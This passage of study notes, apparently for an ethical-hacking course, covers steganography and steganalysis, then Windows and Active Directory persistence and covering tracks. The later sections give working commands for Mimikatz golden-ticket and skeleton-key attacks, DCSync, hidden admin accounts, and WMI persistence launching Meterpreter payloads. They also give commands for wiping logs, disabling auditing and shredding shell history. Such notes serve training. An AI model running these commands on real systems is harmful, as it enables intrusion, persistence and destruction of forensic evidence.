						- Grille Cipher : This technique encrypts plaintext by writing it onto a sheet of paper through a pierced (or stenciled) sheet of paper, cardboard, or a similar material. The message can be deciphered using an identical grille. This system is difficult to crack, as only someone with the correct grille can extract the hidden message.
					- Jargon Code : In this type of steganography, a specific language or jargon is used that is meaningful only to a particular group of people, while remaining incomprehensible to others. A jargon code functions similarly to a substitution cipher but replaces entire words instead of individual letters.
		- Types of Steganography based on Cover Medium:
			- Image Steganography :
				- Image File Steganography Techniques:
					- Least-Significant-Bit Insertion : The least-significant-bit (LSB) insertion technique is a widely used method in image steganography, where the rightmost bit of each pixel holds secret data. In this method, the binary data of the message is divided and embedded into the LSB of each pixel in a predetermined sequence. Modifying the LSB causes minimal changes to the image, resulting in no visible difference to the human eye and making detection difficult.
					- Masking and Filtering : Masking and filtering techniques exploit human vision's inability to detect subtle changes in images. Similar to watermarks on paper, these methods use grayscale images or digital watermarks to conceal information. Masking hides secret data by embedding it within an image file.
					- Algorithms and Transformation : The algorithms and transformation technique hides secret information during image compression by applying compression algorithms and transformation functions. This method uses mathematical functions to conceal data by embedding it in the least significant coefficients during the compression process.
						- Types of Transformation used in the Compression Algorithm:
							- Fast Fourier transformation
							- Discrete cosine transformation
							- Wavelet transformation
			- Document steganography
			- Folder Steganography
			- Video Steganography
			- Audio Steganography
				- Audio Steganography Methods:
					- Echo Data Hiding : The echo data hiding method embeds secret information in audio by adding an echo with controlled parameters - amplitude, decay rate, and delay. Imperceptible delay times encode binary data, while the parameters remain below audible thresholds, ensuring the hidden data blends seamlessly with the carrier signal.
					- Spread Spectrum Method:
						- Direct-Sequence Spread Spectrum (DSSS) : DSSS is a frequency modulation technique that spreads a low-bandwidth signal over a broad frequency range, allowing multiple users to share a single channel. In DSSS steganography, secret messages are embedded in radio wave frequencies, though the method may introduce some random noise to the signal.
						- Frequency-Hopping Spread Spectrum (FHSS) : In FHSS, the frequency spectrum of an audio file is rapidly altered, hopping between different frequencies. This spread spectrum method is crucial for secure communications in both commercial and military applications.
						- LSB Coding : LSB encoding embeds a secret binary message in the least significant bit of each audio signal sample, enabling the hiding of large data volumes. While using the last two bits increases capacity, it risks adding noise. However, its poor resistance to manipulation makes it less reliable, as channel noise and resampling can easily reveal hidden data.
						- Tone Insertion : This method embeds data in an audio signal by inserting inaudible low-power tones, concealed by louder audio signals. It is difficult for eavesdroppers to detect the secret message, offering protection against attacks like low-pass filtering and bit truncation. Audio steganography software uses this technique to embed secret data in audio files.
						- Phase Encoding : Phase coding substitutes the phase of an audio segment with a reference phase to represent data. It encodes secret message bits as phase shifts in the phase spectrum of a digital signal, achieving soft encoding with a favorable signal-to-noise ratio.
			- Whitespace Steganography : Whitespace steganography hides messages in ASCII text by appending invisible spaces and tabs to the ends of lines. Since these characters are not typically visible in text viewers, the message remains hidden from casual observers. With built-in encryption, the message remains unreadable even if detected.
			- Web Steganography : In web steganography, a user hides web objects behind other objects and uploads them to a web server.
			- Spam/Email Steganography

		- Steganalysis:
			- Steganalysis is the process of detecting and extracting covert messages hidden using steganography. It identifies hidden messages embedded in images, text, audio, and video carrier mediums, serving as the reverse process of steganography.
			- Steganalysis has two aspects: detection and distortion of messages. In the detection phase, the analyst examines the relationships between the steganography tools, stego-media, cover, and message. In the distortion phase, the analyst manipulates the stego-media to extract the embedded message and determines if it is useless and should be removed.
			- Steganalysis Methods/ Attacks on Steganography:
				- Stego-only : In a stego-only attack, the steganalyst or attacker only has access to the stego-medium or stego-object, with no additional information. The goal is to try every possible steganography algorithm and related attack to recover the hidden information.
				- Known-stego : This attack allows the attacker to know the steganography algorithm, as well as both the original and stego-objects, enabling the extraction of the hidden information using the available data.
				- Known-message : The known-message attack assumes access to both the message and the stego-medium. With this information, the attacker can detect the technique used to hide the message.
				- Known-cover : In a known-cover attack, attackers have access to both the stego-object and the original cover medium. This allows them to compare the two and detect changes in the medium's format to uncover the hidden message.
				- Chosen-message : In this attack, the steganalyst uses a known message to generate a stego-object with various steganography tools, aiming to identify the algorithm used to hide the information. The goal is to detect patterns in the stego-object that may indicate the specific steganography tools or algorithms employed.
				- Chosen-stego : The chosen-stego attack occurs when the steganalyst knows both the stego-object and the steganography tool or algorithm used to hide the message.
				- Chi-square : The chi-square method uses probability analysis to test whether a stego-object and the original data are identical. If the difference is nearly zero, no data is embedded; otherwise, the stego-object contains hidden data.
				- Distinguishing Statistical : In the distinguishing statistical method, the steganalyst or attacker analyzes statistical changes caused by the embedded algorithm, along with the length of the hidden data, to detect the presence of embedded information.
				- Blind Classifier : In the blind classifier method, a blind detector is provided with the original or unmodified data to learn its characteristics from multiple perspectives. The output is then used to train a classifier to detect differences between the stego-object and the original data.
			- Detecting Steganography:
				- Text File : In text steganography, data is hidden by altering character positions, which can be detected through patterns, language use, line height, or unusual blank spaces. A simple word processor may reveal these alterations by displaying spaces, tabs, and other hidden characters. Detection can focus on unusual patterns, extra spaces, and invisible characters in the stego-object.
				- Image File : Hidden information in an image can be detected by analyzing changes in size, file format, timestamps, and the color palette. Key detection indicators include display distortions, image degradation, anomalies in color composition, luminance, pixel relationships, and exaggerated noise. Statistical analysis helps identify steganography by examining the least significant bits (LSBs), which become non-random when a secret message is embedded. By comparing LSBs with random values, statistical methods can reveal hidden data, particularly when encrypted data with high entropy is used.
				- Audio File : Audio steganography embeds confidential information, such as private documents and files, into digital sound. Statistical analysis can detect it by examining LSB modifications and scanning inaudible frequencies for hidden data. Odd distortions and patterns in the audio signal often reveal the presence of secret information.
				- Video File : Detection of secret data in video files combines methods used for both image and audio files. Special code signs and gestures can also assist in identifying hidden information.

- Establishing Persistence
	- Maintaining Persistence Using Windows Sticky Keys:
		- In Windows, the Sticky Keys feature allows users to use modifier keys like Ctrl, Alt, and Shift without pressing them simultaneously. Attackers can exploit this feature to maintain persistence. After gaining access to a remote system, attackers can escalate their privileges using the BypassUAC exploit in Metasploit. Once privileges are escalated, they can use the Sticky Keys module in Metasploit to maintain persistence on the compromised system. When the attacker restarts the system and presses the Shift key five times, a Command Prompt window opens with system-level access.
	- Maintaining Persistence by Abusing Boot or Logon Autostart Executions:
		- Attackers exploit system boot or logon autostart programs to escalate privileges and maintain persistence by applying custom configuration settings on a compromised machine. This allows attackers to automatically run programs during system boot or logon. They typically use two methods to abuse autostart execution: registry run keys and startup folders.
		- Executing Logon Autostart:
			- Registry Run Keys:
				- Enumerating Assign Permissions Using WinPEAS:
					- Attackers can use the WinPEAS script to identify potential paths for privilege escalation within Windows.
					- Enumerate permissions: winPEASx64.exe quiet applicationinfo
					- This command enables attackers to enumerate all permissions assigned to a valid user for a specific service.
			- Startup Folder:
				- Attackers can inject malicious applications into the startup folder, causing them to run automatically when a user signs into their account. They can escalate privileges by exploiting and manipulating the startup folder's locations.
				- Abusing Startup Folder Using icacls:
					- Misconfigured locations in a startup folder can be exploited by attackers to inject malicious payloads, such as Remote Access Trojans (RATs), enabling them to maintain persistence.
					- Enumerate permissions: icacls "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
				- Using Sysinternals tool (accesschk.exe) for Identifying Permissions:
					- accesschk.exe /accepteula "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
	- Domain Dominance Through Different Paths:
		- Domain dominance is the process of gaining control over critical assets, such as domain controllers, on a target system to access other networked resources. Attackers often use social engineering techniques to launch domain dominance attacks by compromising an internal user.
		- Domain Dominance Techniques:
			- Remote Code Execution:
				- Attackers attempt to execute malicious code on the target domain controller (DC) via the command-line interface (CLI) to initiate a domain dominance attack. By leveraging this technique, attackers can maintain persistence, enabling them to carry out malicious activities over an extended period without detection.
				- Steps:
					- Create a Dummy Process and User on the Target DC - Use WMI to create a dummy user and process on the target domain controller (DC):
						- wmic /node:<DomainControllerName> process call create "net user /add PiratedProcess Du^^Y01"
						- Here, PiratedProcess is the username, and Du^^Y01 is the password for the dummy user created on the target DC.
					- Add the User to the "Admins" Group: PsExec.exe \\<DomainControllerName> -accepteula net localgroup "Admins" PiratedProcess /add
					- Identify the Created User in Active Directory Users and Computers (ADUC) - Navigate to Active Directory Users and Computers (ADUC) and locate the user created using the above command.
					- Verify Membership in the "Admins" Group - Open the properties window for the created user in ADUC. Navigate to the Member Of tab to confirm their membership in the "Admins" group.
					- After successfully adding a new user to the "Admins" group, the attacker uses the newly created credentials to maintain persistence on the target domain controller (DC).
			- Abusing Data Protection API (DPAPI):
				- The Data Protection API (DPAPI) is a unified framework in Windows environments that securely stores cryptographically protected files, browser passwords, and other sensitive data. Windows domain controllers (DCs) hold a master key that can decrypt DPAPI-protected files.
				- Recover the master key with Mimikatz using the password of a compromised user.
				- Retrieve all local master keys with compromised admin credentials: sekurlsa::dpapi
				- Retrieve all backup master keys: lsadump::backupkeys /system:dc01.offense.local /export
				- Cross-check whether the secured master keys have been obtained by navigating to the directory containing the mimikatz.exe file and looking for file formats such as .der, .key, .pvk, and .pfx. By obtaining the master key, the attacker can decrypt any DPAPI-encrypted file from any device on the network, enabling them to maintain persistence.
			- Malicious Replication:
				- It allows attackers to create an exact copy of user data using administrative credentials. Attackers often target sensitive accounts, such as "krbtgt," to replicate them.
				- Malicious replication: Invoke-Mimikatz -command '"lsadump::dcsync /domain:<Target Domain> /user:<krbtgt>\<Any Domain User>"
			- Skeleton Key Attack:
				- A skeleton key is a type of malware that attackers use to inject false credentials into domain controllers, creating a backdoor password. It is a memory-resident virus that allows an attacker to obtain a master password, enabling them to authenticate as a legitimate user within the domain.
				- Working of the Skeleton Key Attack:
					- This attack is straightforward and only requires executing misc::skeleton on each domain controller.
					- Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' - <target domain controller name>
					- With this, the attacker can masquerade as any user using the default Mimikatz credentials.
					- Attackers can also execute skeleton key attacks by patching the Local Security Authority Subsystem Service (LSASS). They leverage their access to the domain to install malware on the domain controllers (DCs), which then auto-patches the LSASS, generating a new skeleton key or master password that works for all users.
					- The error shown in the above screenshot appears if LSASS has already been patched with skeleton keys. Alternatively, attackers can use the Empire tool, which includes a module that automates the process by running Mimikatz entirely in memory, preventing the binary from being dropped on the domain controller (DC).
					- powershell/persistence/misc/skeleton_key
			- Golden Ticket Attack:
				- A golden ticket attack is a post-exploitation technique used by attackers to gain complete control over the entire Active Directory (AD). Attackers execute this attack by exploiting the Kerberos authentication protocol, forging Ticket Granting Tickets (TGTs) after compromising a Key Distribution Center (KDC) account (KRBTGT), which grants access to various resources. This attack enables attackers to maintain persistence and gather more information within the AD by masquerading as privileged users.
				- Working of Golden Ticket Attack:
					- Attackers typically compromise a valid user account either through phishing emails or by exploiting vulnerabilities or security misconfigurations.
					- Attackers gather domain information, such as the domain name and domain security identifier (SID), using the whoami command.
					- Elevate privileges to the domain administrator-level account to steal the NTLM hash of KRBTGT. Use Mimikatz to perform a pass-the-hash or DCSync attack to extract KRBTGT's password hash:
					- lsadump::dcsync /domain:<domain_name> /user:krbtgt
					- After obtaining the password hashes, use the Mimikatz command to create a golden ticket by impersonating an administrator-level user. This grants access to any resource, group, or domain within the environment:
					- kerberos::golden /domain:<domain_name> /sid:<SID> /rc4:<KRBTGT_hash> /id:<value> /user:<username>
					- The final step can also be executed using the NTLM hashes obtained from a malicious replication process.
					- Attackers maintain persistence by configuring the ticket's validity period. 
			- Silver Ticket Attack:
				- A silver ticket attack is a post-exploitation technique used by attackers to steal legitimate users’ credentials and forge a fake Kerberos Ticket Granting Service (TGS) ticket. To initiate this attack, the attacker must have access to credentials obtained from a local service account or the system’s SAM database. The attacker then creates a forged Kerberos TGS ticket using the Mimikatz tool to establish a connection with the target service.
				- The attacker initially compromises the target system through techniques such as phishing or vulnerability exploitation. After gaining access to a networked system, the attacker initiates the silver ticket attack by forging a false Kerberos silver ticket.
					- The attacker gathers domain information, such as the domain name and domain security identifier (SID), using the whoami command.
					- The attacker obtains additional details about the service or service type to target.
					- The attacker deploys password-cracking tools, such as Mimikatz, on the compromised system to extract the Kerberos service’s local NTLM password hash.
					- The attacker initiates offline password attacks, such as Kerberoasting, to obtain a raw or plaintext password for the service.
					- The attacker forges a Kerberos TGS ticket using Mimikatz to establish a connection with the target service.
					- The attacker uses both the forged TGS and the hash data to authenticate the local service as a legitimate user.
					- The attacker exploits the TGS to elevate privileges and permissions.
					- Note: Privilege Attribute Certificate (PAC) validation requests and PAC validation responses are optional in a silver ticket attack.
					- If an attacker successfully elevates privileges and obtains admin rights to execute code on a local machine, they can run the following command to retrieve the NTLM hashes of the AD system’s password:
					- mimikatz “privilege::debug” “sekurlsa::logonpasswords”
	- Maintain Domain Persistence Through AdminSDHolder:
		- AdminSDHolder is an object in Active Directory that protects user accounts and groups with high privileges from accidental modifications to security permissions. Attackers with admin privileges on a compromised domain can abuse the SDProp process to establish persistence. They can add a user account to the ACL to gain "GenericAll" privileges, which are equivalent to the privileges of a domain administrator.\
		- Establishing Domain Persistence by Abusing AdminSDHolder:
			- Add user account Martin to the ACL:
				- Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName Martin -Verbose -Rights All
			- SDProp process retrieves the ACL to check whether the Martin account has “GenericAll” permissions:
				- Get-ObjectAcl -SamAccountName "Martin” -ResolveGUIDs
			- Change the default time of SDProp to 3 min by modifying the registry:
				- REG ADD HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\NTDS\Parameters /V AdminSDProtectFrequency /T REG_DWORD /F /D 300
			- Add the account Martin to the group Domain Admins using the following command:
				- net group “Domain Admins” Martin /add /domain
			- Check the accessibility of the domain controller (DC) through which domain persistence is created:
				- dir \\10.10.1.22\c$
	- Maintaining Persistence Through WMI Event Subscription:
		- Attackers exploit Windows Management Instrumentation (WMI) event subscriptions to execute malicious content and establish persistence on a target system. By leveraging various scripts and techniques, they manipulate WMI's features to create event subscriptions for malicious triggers. When these events occur, they initiate the execution of arbitrary code, enabling attackers to maintain persistence. These scripts further automate the process by concealing malicious payloads and ensuring persistence, even after the system is rebooted or restarted.
		- Techniques to Maintain Persistence Using WMI Event Subscription:
			- Using Command Prompt:
				- Use wmic commands create a malicious namespace and subscription for the events:
					- eSpace="root\cimv2",QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
					- wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer CREATE Name="EthicalHacker", ExecutablePath="C:\Windows\System32\ethicalhacker.exe",CommandLin eTemplate="C:\Windows\System32\thicalhacker.exe"
					- wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name=\"EthicalHacker\"", Consumer="CommandLineEventConsumer.Name=\"EthicalHacker\""
				- The malicious payload is designed to automatically execute within 60 seconds of every system restart, establishing a Meterpreter session with the attacker.
			- Using Wmi-Persistence:
				- Attackers also utilize Wmi-Persistence, a PowerShell script, to perform WMI event subscriptions and achieve persistence. This script triggers various actions, including Startup, Logon, Interval, and Timed events, enabling attackers to execute multiple functions such as the installation, review, and removal of WMI event subscriptions.
				- Execute malicious payload on the compromised system and achieve persistence:
				- Install-Persistence -Trigger Startup -Payload "c:\windows\system32\ethicalhacker.exe"
				- The above command includes a Startup trigger that executes the specified payload within 5 minutes of a system reboot, establishing a Meterpreter session with the attacker.
			- Using PowerLurk:
				- PowerLurk is a PowerShell toolset for creating malicious WMI event subscriptions. The goal of PowerLurk is to simplify the process of triggering WMI events during penetration tests or red-team engagements. Attackers use PowerLurk to create malicious WMI event subscriptions that execute arbitrary payloads on every Windows logon. This script can trigger events such as InsertUSB, UserLogon, Timed, Interval, and ProcessStart.
				- Import the PowerLurk script to a local instance: Import-Module .\PowerLurk.ps1
				- Identify all the active WMI event objects: Get-WmiEvent
				- Create a malicious event subscription that executes the malicious payload and creates a Meterpreter session:
				- Register-MaliciousWmiEvent -EventName Logonlog -PermanentCommand "ethicalhacker.exe" -Trigger UserLogon -Username any
	- Overpass-the-Hash Attack:
		- The Overpass-the-Hash (OPtH) attack is an extension of the Pass-the-Ticket and Pass-the-Hash attacks. It is a type of credential theft-and-reuse attack that allows attackers to perform malicious activities on compromised devices or within a compromised environment. The primary goal of an OPtH attack is to acquire Kerberos tickets using the NTLM hash of different user accounts.
		- Mimikatz to perform OPtH attacks:
			- The Mimikatz tool allows attackers to obtain and store various authentication credentials, such as Kerberos tickets. It aids attackers in stealing credentials and performing privilege escalation.
			- Perform the attack and obtain AES128, NTLM (RC4), and AES256 keys for a Kerberos ticket:
				- privilege::debug
				- sekurlsa::ekeys
	- Linux Post-Exploitation:
		- After compromising a target system and gaining shell access, attackers typically attempt further exploitation to gain full access to additional resources and establish long-term persistence.

## Clearing Logs
- Covering Tracks
	- Once intruders have successfully gained administrator access to a system, they will attempt to cover their tracks to avoid detection.
	- Covering tracks is a key stage in system hacking where attackers erase or alter logs, error messages, and system configurations to avoid detection. By manipulating event logs and file attributes, they make it appear as if no compromise occurred, often using rootkits to disable logs. If maintaining long-term access, attackers selectively remove evidence from logs and restore file attributes. Detecting such changes can be difficult, but file hashes can identify tampered files.
	- Manipulate the log files:
		- SECEVENT.EVT (security) : failed logins, accessing files without privileges
		- SYSEVENT.EVT (system) : driver failure, things not operating correctly
		- APPEVENT.EVT (applications)
	- Techniques Used for Covering Tracks:
		- Disabling Auditing:
			- An attacker disables the auditing features of the target system.
			- Auditpol : Auditpol displays information about and allows manipulation of audit policies. Auditpol.exe is the command-line utility used to modify audit security settings at the category and sub-category levels. Attackers can use Auditpol to enable or disable security auditing on local or remote systems and adjust audit criteria for various categories of security events.
			- Enabling system auditing: C:\>auditpol /set /category:”system”,”account logon” /success:enable /failure:enable
			- Disabling system auditing: C:\>auditpol /set /category:”system”,”account logon” /success:disable /failure:disable
			- View defined auditing settings: auditpol /get /category:*
		- Clearing Logs:
			- An attacker clears or deletes system log entries related to their activities.
			- Clear_Event_Viewer_Logs.bat : Clear_Event_Viewer_Logs.bat is a utility used to wipe out the logs on the target system. It deletes the security, system, and application logs to cover the attacker’s tracks.
			- If the system is compromised with Metasploit, the attacker can use a Meterpreter shell to clear all logs from the Windows system. To do this, the attacker launches the Meterpreter shell prompt from the Metasploit Framework, then types the "clearev" command in the Meterpreter shell prompt and presses Enter. This will initiate the process of wiping out the logs on the target system.
			- Clear PowerShell logs using Clear-EventLog:
				- Clear the entries from the PowerShell event log: Clear-EventLog "Windows PowerShell"
				- Clear specific multiple log types: Clear-EventLog -LogName ODiag, OSession -ComputerName localhost, Server02
					- This command clears all the log entries in Microsoft Office Diagnostics (ODiag) and Microsoft Office Sessions (OSession) on the local computer and Server02 remote computer.
				- Clear all the logs on the specified systems, and then display the event log list: Clear-EventLog -LogName application, system -confirm
			- Clear event logs using wevtutil utility:
				- Display list of event logs: wevtutil el
				- Clear the event logs: wevtutil cl <log_name>
			- Manually Clearing Event Logs:
				- Windows:
					- Navigate to Start -> Control Panel -> System and Security -> Windows Tools -> double-click Event Viewer
					- Delete the all the log entries logged while compromising the system
				- Linux:
					- Navigate to the /var/log directory on the Linux system
					- Open the plaintext file containing log messages with text editor /var/log/<filename.log>
					- Delete all the log entries logged while compromising the system
		- Manipulating Logs:
			- An attacker alters logs to prevent detection and avoid legal consequences.
		- Covering Tracks on the Network:
			- An attacker employs techniques such as reverse HTTP shells, reverse ICMP tunnels, DNS tunneling, and manipulation of TCP parameters to hide their activities on the network.
			- Using Reverse HTTP Shells:
				- The attacker installs a reverse HTTP shell on the victim’s machine, designed to request commands from an external controller operating the reverse HTTP shell. In this setup, the victim acts as a web client executing HTTP GET requests, while the attacker functions as a web server, responding to these requests. This type of traffic is often perceived as normal by an organization’s network perimeter security controls, such as DMZs, firewalls, and similar systems.
			- Using Reverse ICMP Tunnels:
				- The attacker employs an ICMP tunneling technique, using ICMP echo and ICMP reply packets to carry TCP payloads, enabling stealthy access to or control of a system. The victim's system is manipulated to encapsulate the TCP payload within an ICMP echo packet, which is then sent to the proxy server. Many organizations have security mechanisms that focus on inspecting incoming ICMP packets but neglect outgoing ICMP packets, allowing attackers to bypass firewalls with relative ease.
			- Using DNS Tunneling:
				- Attackers can leverage DNS tunneling to embed malicious content or data from other programs within DNS queries and responses. This technique establishes a covert channel to communicate with remote servers and applications. Through this back channel, attackers can exfiltrate stolen, confidential, or sensitive information from the targeted server.
			- Using TCP Parameters:
				- Attackers can exploit TCP parameters to distribute payloads and establish covert channels.
				- The TCP fields where data can be concealed include:
					- IP Identification Field : This method involves transferring a payload bit by bit over an established session between two systems. In this approach, one character is encapsulated within each packet.
					- TCP Acknowledgment Number : This method is more complex as it involves the use of a bounce server. The bounce server receives packets from the victim and forwards them to the attacker. In this approach, one hidden character is relayed by the bounce server per packet.
					- TCP Initial Sequence Number : This method does not require an established connection between the two systems. In this approach, one hidden character is encapsulated within each SYN request and reset packet.
		- Covering Tracks on the OS:
			- Windows:
				- NTFS includes a feature called Alternate Data Streams (ADS), which can be exploited by attackers to hide malicious files within legitimate files.
				- Hide file using NTFS:
					- Open the Command Prompt with elevated privileges.
					- Run command: type C:\SecretFile.txt > C:\LegitFile.txt:SecretFile.txt
					- In this case, the "SecretFile.txt" is hidden within "LegitFile.txt" on the C: drive.
					- View the hidden file by hidden file's name: more < C:\LegitFile.txt:SecretFile.txt
				- Modifying Date and Time (changing the access time of specific files):
					- timestomp file_name.doc -z “<Date> <time>”
					- powershell -Command (Get-Item $File_name).LastWriteTime = $(Get-Date).AddHours(-10)
					- Change access time: touch -a -d '<date> <time>' $File_name
					- Change date and time of last modification: touch -m -d '<date> <time>' $File_name
			- UNIX/LINUX:
				- In UNIX, files can be hidden by simply appending a dot (.) at the beginning of the file name.
				- Covering BASH Shell Tracks:
					- BASH is an sh-compatible shell that stores command history in a file located at ~/.bash_history
					- Disabling history: export HISTSIZE=0
					- Clear stored history: history –c
					- Clear history of current shell: history -w
					- Clear user's complete history: cat /dev/null > ~/.bash_history && history -c && exit
					- Shred history file (making its content unreadable): shred ~/.bash_history
					- Shred history file and clear evidence of command: shred ~/.bash_history && cat /dev/null > ~/.bash_history && history -c && exit
		- Deleting Files:
			- Delete Files using Cipher.exe:
				- Cipher.exe is an in-built Windows command-line tool that can be used to securely delete data by overwriting it, making it difficult to recover in the future.
				- To overwrite deleted files in specific folder: cipher /w:<drive_letter>:\<folder_name>
				- To overwrite all the deleted files in drive: cipher /w:<drive_letter>
		- Disabling Windows Functionality:
			- An attacker disables Windows features, such as last access timestamps, hibernation, virtual memory, and system restore points, to cover their tracks.
			- Disable the Last Access Timestamp:
				- The last access timestamp of a file records the date and time when the file was last opened for reading or writing. Each time a user accesses the file, the timestamp is updated.
				- Fsutil is a Windows utility used to configure NTFS volume behavior parameters, such as DisableLastAccess, which controls the enabling or disabling of the last access timestamp.
				- Disable last access updates: fsutil behavior set disablelastaccess 1
				- Enable last access updates: fsutil behavior set disablelastaccess 0
			- Disable Windows Hibernation:
				- The hibernation file (Hiberfil.sys) is a hidden system file located in the root directory of the drive where the operating system is installed. This file stores the contents of the system's RAM on the hard disk when the user selects to hibernate the system.
				- Windows hibernation can be disabled using either the Registry Editor or the powercfg command.
				- Disable Windows hibernation through the Registry Editor:
					- Open the Registry Editor and navigate to the path: Computer\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Power
					- In the right pane, double-click on HibernateEnabledDefault; the Edit DWORD (32-bit) Value dialog box will appear.
					- In the Value data field, enter 0 to disable hibernation.
					- Click OK to apply the changes.
				- Disable Windows hibernation using powercfg:
					- Launch the Command Prompt with administrator privileges.
					- Disable hibernation: powercfg.exe /hibernate off
			- Disable Windows Virtual Memory (Paging File)
				- Virtual memory, also called the paging file, is a special file in Windows used as compensation when physical memory (RAM) falls short of available space. For example, if an attacker has an encrypted file and wants to read it, it must first be decrypted. The decrypted data may remain in the paging file even after the attacker logs out of the system.
				- Disable paging:
					- Open the Control Panel and navigate to: System and Security -> System -> Advanced system settings
					- A System Properties dialog box will appear. In the Advanced tab, click Settings under the Performance section.
					- The Performance Options dialog box will appear. Go to the Advanced tab and click Change under the Virtual Memory section.
					- In the Virtual Memory dialog box, uncheck Automatically manage paging file size for all drives.
					- Select the drive where paging should be disabled, then check the option No paging file and click Set.
					- In the System Properties window, click Yes.
					- Finally, click OK to apply the changes.
			- Disable System Restore Points:
				- System restore points contain information about hidden data and previously deleted files, which poses a risk for attackers, as deleted files can be recovered from earlier restore points.
				- Disable system restore points:
					- Open the Control Panel and navigate to: System and Security -> System -> System Protection
					- A System Properties dialog box will appear. In the System Protection tab, select the drive and click Configure
					- Under the Restore Settings section, select the Disable system protection option and click the Delete button.
					- The System Protection wizard will appear; click Continue to delete all restore points on the drive.
					- Click OK to apply the changes.
					- Repeat the above steps for all disk partitions.
			- Disable Windows Thumbnail Cache:
				- Thumbs.db is a Windows file that stores thumbnails of document types such as PPTX and DOCX, as well as graphic files like GIF, JPEG, PNG, and TIFF. This thumbnail file contains information about files that were previously deleted or accessed on the system.
				- For example, if an attacker used an image file to hide a malicious file and later deleted it, a thumbnail of this image would be stored inside the thumbs.db file, revealing that the deleted file was previously used on the system.
				- Disable the thumbnail cache:
					- Press the Windows + R keys to open the Run dialog box.
					- Type gpedit.msc and press Enter or click OK.
					- The Local Group Policy Editor window will appear. Navigate to: User Configuration -> Administrative Templates -> Windows Components -> File Explorer
					- Double-click on the "Turn off the caching of thumbnails in hidden thumbs.db files" setting in the right pane.
					- Select Enabled to turn off the thumbnail cache.
					- Click OK to apply the changes.
			- Disable Windows Prefetch Feature:
				- Prefetch is a Windows feature that stores data about applications typically used by system users. This stored data helps enhance system performance by reducing the time required to load or start applications.
				- For example, if an attacker installs and then uninstalls a malicious application, a record of that application may still be stored in the Prefetch file. These Prefetch files can be useful for security personnel in recovering information about deleted applications during the investigation of a security incident.
				- Disable the Prefetch feature:
					- Press the Windows + R keys to open the Run dialog box.
					- Type services.msc and press Enter or click OK.
					- Search for the SysMain (Superfetch) service, then double-click it to open the SysMain Properties (Local Computer) window.
					- In the Startup type drop-down menu, select Disabled.
					- Click OK to apply the changes.
			- Clear Online Tracks from Privacy Settings (Windows 11):
				- Right-click on the Start button, select Settings, and navigate to Personalization.
				- In the Personalization section, click on Start in the left pane.
				- Turn off both "Show most used apps" and "Show recently opened items in Start, Jump Lists, and File Explorer."
			- Clear Online Tracks From the Registry (Windows 11):
				- Open the Registry Editor by pressing Win + R, typing regedit, and pressing Enter.
				- Navigate to: HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer
				- Locate and remove the key for "RecentDocs".
				- Delete all values except for "(Default)".
		- Delete Windows History:
			- Deleting Windows Activity History:
				- Attackers can cover their tracks by deleting the Windows Activity history after unauthorized system use, thereby removing evidence of their activities. Since the Windows Activity history records user activities, including file access, application usage, and browsing history, erasing this data can help conceal their presence and actions on the compromised system.
				- Delete Windows Activity History:
					- Open the Settings by clicking the Start button or by pressing the Win + I keys together.
					- In the Settings window, click on Privacy & security in the left pane, then click on the Activity history section in the right pane.
					- Click the Clear button under the Clear activity history section.
					- Click OK on the pop-up to confirm clearing the activity history.
					- Once the process is complete, a checkmark will appear next to the Clear button, indicating the action was successful.
		- Deleting Incognito History:
			- Attackers use incognito mode to prevent the browser from storing browsing history, cookies, and other site data locally on the device. Incognito mode helps attackers conceal their online activities from others who may have access to the device.
			- Deleting Incognito History in Windows:
				- Open the Start menu, search for Command Prompt, and select Run as administrator.
				- Display the list of recently visited domains, including those accessed in incognito mode: ipconfig /displaydns
				- Clear all DNS cache entries and remove traces of recent browsing history: ipconfig /flushdns
			- Deleting Incognito History in macOS:
				- Open the Applications folder, select Utilities, and run Terminal.
				- Delete the incognito browsing history: sudo killall -INFO mDNSResponder
		- Hiding Artifacts:
			- Attackers often attempt to conceal artifacts related to their malicious activities in order to bypass security controls. Every operating system hides artifacts, such as internal task execution data and critical system files. Attackers take advantage of this feature to hide their own artifacts - such as directories, user accounts, files, folders, or other system-related elements - within existing system artifacts to evade detection.
			- Hiding Artifacts in Windows:
				- Hiding Files and Folders: attrib +h +s +r <FolderName>
				- Hiding Users:
					- Create hidden user account: net user <UserName> /add
					- Activate the account for exploitation: net user <UserName> /active:yes
					- Hide the account when it is not required: net user <UserName> /active:no
				- Hiding User Accounts:

			- Hiding Artifacts in macOS:
				- Hiding Files and Folder:
					- Hide files: defaults write com.apple.finder AppleShowAllFiles FALSE killall Finder
					- Hide specified file (Add space at the end): chflags hidden <filename>
		- Clear Online Tracks:
			- Attackers can erase online traces stored on the target computer, including web history, logs, cookies, cache, download records, and timestamps of visited sites. This prevents victims from detecting the online activities conducted by the attackers.
			- Ways to Clear:
				- Use private browsing
				- Delete history in the address field
				- Disable stored history
				- Delete private data
				- Clear cookies on exit
				- Clear cache on exit
				- Delete downloads
				- Disable password manager
				- Clear data in the password manager
				- Delete saved sessions
				- Delete user JavaScript
				- Set up multiple users
				- Remove Most Recently Used (MRU)
				- Clear toolbar data from browsers
				- Turn off AutoComplete
	- Anti-forensics for Covering Tracks:
		- Anti-forensics is a set of techniques used by attackers or perpetrators to conceal their malicious activities. By employing anti-forensics methods, attackers erase, alter, or conceal various actions taken to compromise a target system or network.
		- Anti-forensics Techniques:
			- Data/File Deletion : When a file is deleted from the hard drive, the operating system removes the pointer to the file. In the case of the Windows operating system, deleted data remains in the Recycle Bin if attackers use the normal delete operation, rather than the Shift+Delete operation. To prevent the recovery of such deleted files, attackers may hide or delete the metadata associated with the files in the Recycle Bin.
			- Password Protection : Attackers use password protection techniques to conceal malicious activities, prevent the reverse engineering of applications, prevent information extraction from network devices, and prevent access to critical files and folders on the system or hard disk.
